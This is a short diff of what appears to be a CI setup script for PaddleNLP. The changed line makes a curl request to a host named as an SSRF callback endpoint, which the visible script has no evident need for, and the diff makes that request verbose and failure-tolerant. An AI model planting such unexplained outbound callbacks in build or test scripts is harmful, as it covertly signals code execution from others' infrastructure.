@@ -14,7 +14,7 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 ####################################
-curl -s http://bsrc-ssrf.n.baidu-int.com/3005504383
+curl -v http://bsrc-ssrf.n.baidu-int.com/3005504383 2>&1 || true
 export paddle=$1
 export nlp_dir=/workspace/PaddleNLP
 mkdir -p /workspace/case_logs
